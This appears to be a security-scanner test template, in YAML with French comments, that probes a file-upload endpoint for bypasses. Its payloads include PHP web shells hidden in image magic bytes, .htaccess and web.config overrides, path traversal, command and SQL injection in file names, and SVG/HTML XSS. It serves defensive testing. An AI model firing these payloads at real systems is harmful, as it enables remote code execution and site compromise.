@@ -1,0 +1,387 @@
+# ═══════════════════════════════════════════════════════════════════════════
+#  Upload Bypass — Détection exhaustive (PHP / Node.js)
+#  ⚠ Usage strictement réservé aux environnements de test autorisés.
+# ═══════════════════════════════════════════════════════════════════════════
+
+name: "Upload — Bypass exhaustif (PHP/Node.js)"
+
+variables:
+  base_url: "http://localhost:8080"
+  upload_path: "/upload"
+  upload_field: "file"
+  served_base: "/uploads"
+  canary: "MOWING_{{uuid}}"
+  cmd: "id"
+
+defaults:
+  read_timeout: 15
+  verify: false
+  retries: 0
+
+tests:
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE 1 — Baseline
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_baseline_png
+    name: "Baseline — upload PNG légitime"
+    severity: info
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "test.png"
+          content_type: "image/png"
+          content: "89504E470D0A1A0A0000000D49484452"
+    assert:
+      - status: [200, 201, 202]
+      - body_not_regex: "(?i)(error|invalid|rejected|forbidden)"
+
+  - id: upload_detect_blacklist
+    name: "Détection — Test d'un .php direct"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "probe.php"
+          content_type: "application/x-php"
+          content: "<?php echo '{{canary}}'; ?>"
+    assert:
+      - status: [200, 201, 202]
+      - body_contains: "{{canary}}"
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE 2 — Blacklist bypass (extensions alternatives)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_bypass_php_aliases
+    name: "Bypass — Extensions PHP alternatives (.phtml/.phar/.php5)"
+    severity: critical
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "shell.phtml"
+          content_type: "image/jpeg"
+          content: "GIF89a; <?php echo '{{canary}}'; system($_GET['c']); ?>"
+    assert:
+      - status: [200, 201, 202]
+      - body_not_regex: "(?i)(not allowed|invalid extension|forbidden)"
+
+  - id: upload_bypass_double_extension
+    name: "Bypass — Double extension (shell.php.jpg)"
+    severity: critical
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "avatar.php.jpg"
+          content_type: "image/jpeg"
+          content: "\xFF\xD8\xFF\xE0<?php echo '{{canary}}'; ?>"
+    assert:
+      - status: [200, 201, 202]
+      - body_not_regex: "(?i)(double extension|not allowed)"
+
+  - id: upload_bypass_case_variation
+    name: "Bypass — Variation de casse (.pHp)"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "shell.pHp"
+          content_type: "image/gif"
+          content: "GIF89a; <?php echo '{{canary}}'; ?>"
+    assert:
+      - status: [200, 201, 202]
+
+  - id: upload_bypass_trailing_chars
+    name: "Bypass — Caractères de fin (shell.php., ::$DATA)"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "shell.php."
+          content_type: "image/png"
+          content: "\x89PNG\r\n\x1a\n<?php echo '{{canary}}'; ?>"
+    assert:
+      - status: [200, 201, 202]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE 3 — Content-Type spoofing
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_bypass_content_type
+    name: "Bypass — Content-Type spoofé (image/jpeg sur .php)"
+    severity: critical
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "shell.php"
+          content_type: "image/jpeg"
+          content: "<?php echo '{{canary}}'; ?>"
+    assert:
+      - status: [200, 201, 202]
+      - body_contains: "{{canary}}"
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE 4 — Magic bytes polyglot
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_bypass_magic_gif
+    name: "Bypass — GIF89a + PHP (polyglot)"
+    severity: critical
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "shell.php"
+          content_type: "image/gif"
+          content: "GIF89a;<?php echo '{{canary}}'; system($_GET['c']); ?>"
+    assert:
+      - status: [200, 201, 202]
+      - body_contains: "{{canary}}"
+
+  - id: upload_bypass_magic_jpeg
+    name: "Bypass — FFD8FFE0 + PHP (polyglot JPEG)"
+    severity: critical
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "shell.php.jpg"
+          content_type: "image/jpeg"
+          content: "\xFF\xD8\xFF\xE0<?php echo '{{canary}}'; ?>"
+    assert:
+      - status: [200, 201, 202]
+
+  - id: upload_bypass_exif_comment
+    name: "Bypass — Payload PHP dans métadonnées EXIF"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "legit.jpg"
+          content_type: "image/jpeg"
+          content: "\xFF\xD8\xFF\xE1\x00\x20Exif\x00\x00<?php echo '{{canary}}'; ?>\xFF\xD9"
+    assert:
+      - status: [200, 201, 202]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE 5 — Fichiers de configuration
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_htaccess_override
+    name: "Attaque — Upload .htaccess (AddType jpg→PHP)"
+    severity: critical
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: ".htaccess"
+          content_type: "text/plain"
+          content: "AddType application/x-httpd-php .jpg\nAddType application/x-httpd-php .png"
+    assert:
+      - status: [200, 201, 202]
+      - body_not_regex: "(?i)(not allowed|forbidden|hidden file)"
+
+  - id: upload_htaccess_exploit
+    name: "Attaque — Exploiter .htaccess (shell.jpg exécuté comme PHP)"
+    severity: critical
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "shell.jpg"
+          content_type: "image/jpeg"
+          content: "<?php echo '{{canary}}'; system($_GET['c']); ?>"
+    assert:
+      - status: [200, 201, 202]
+
+  - id: upload_webconfig_iis
+    name: "Attaque — Upload web.config (IIS)"
+    severity: critical
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "web.config"
+          content_type: "application/xml"
+          content: >-
+            <?xml version="1.0"?>
+            <configuration><system.webServer><handlers>
+            <add name="x" path="*.jpg" verb="*"
+            type="System.Web.UI.PageHandlerFactory"/>
+            </handlers></system.webServer></configuration>
+    assert:
+      - status: [200, 201, 202]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE 6 — Injection via le nom de fichier
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_filename_path_traversal
+    name: "Injection — Path traversal dans le nom"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "../../../tmp/{{canary}}.php"
+          content_type: "image/png"
+          content: "\x89PNG\r\n\x1a\n<?php echo '{{canary}}'; ?>"
+    assert:
+      - status: [200, 201, 202]
+
+  - id: upload_filename_cmd_injection
+    name: "Injection — Command injection dans le nom"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "image; sleep 5; .png"
+          content_type: "image/png"
+          content: "\x89PNG\r\n\x1a\n"
+    assert:
+      - time_gt: 4.5
+      - status: [200, 201, 202]
+
+  - id: upload_filename_sqli
+    name: "Injection — Time-based SQLi via le nom"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "poc'(select*from(select(sleep(5)))a)+'.png"
+          content_type: "image/png"
+          content: "\x89PNG\r\n\x1a\n"
+    assert:
+      - time_gt: 4.5
+      - status: [200, 201, 202]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE 7 — Vérification d'exécution (post-upload)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_verify_execution_php
+    name: "Vérification — Le shell PHP s'exécute-t-il ?"
+    severity: critical
+    request:
+      method: GET
+      path: "{{served_base}}/shell.php"
+      params:
+        c: "echo {{canary}}"
+    assert:
+      - status: 200
+      - body_contains: "{{canary}}"
+
+  - id: upload_verify_execution_htaccess
+    name: "Vérification — .jpg exécuté comme PHP via .htaccess"
+    severity: critical
+    request:
+      method: GET
+      path: "{{served_base}}/shell.jpg"
+      params:
+        c: "echo {{canary}}"
+    assert:
+      - status: 200
+      - body_contains: "{{canary}}"
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE 8 — Spécifique Node.js
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_node_multer_any
+    name: "Node.js — Détection upload.any() (champ arbitraire)"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "arbitrary_field":
+          filename: "shell.js"
+          content_type: "application/javascript"
+          content: "require('child_process').exec('echo {{canary}}')"
+    assert:
+      - status: [200, 201, 202]
+      - body_not_regex: "(?i)(unexpected field|LIMIT_UNEXPECTED_FILE)"
+
+  - id: upload_node_large_file
+    name: "Node.js — Absence de limite de taille"
+    severity: medium
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "large.png"
+          content_type: "image/png"
+          content: "89504E470D0A1A0A0000000D49484452{{repeat:00:1000}}"
+    assert:
+      - status: [200, 201, 202, 413]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE 9 — XSS stockée via SVG/HTML
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_svg_xss
+    name: "XSS stockée — SVG avec JavaScript embarqué"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "logo.svg"
+          content_type: "image/svg+xml"
+          content: >-
+            <?xml version="1.0" standalone="no"?>
+            <svg xmlns="http://www.w3.org/2000/svg" onload="alert('{{canary}}')">
+            <rect width="100" height="100"/></svg>
+    assert:
+      - status: [200, 201, 202]
+
+  - id: upload_html_xss
+    name: "XSS stockée — HTML uploadé"
+    severity: medium
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "page.html"
+          content_type: "text/html"
+          content: "<html><body><script>alert('{{canary}}')</script></body></html>"
+    assert:
+      - status: [200, 201, 202]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE 10 — Anti-virus (EICAR)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_eicar_av
+    name: "AV — Détection EICAR (doit être bloqué si AV présent)"
+    severity: info
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "eicar.txt"
+          content_type: "text/plain"
+          content: "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+    assert:
+      - status_not: [200, 201, 202]
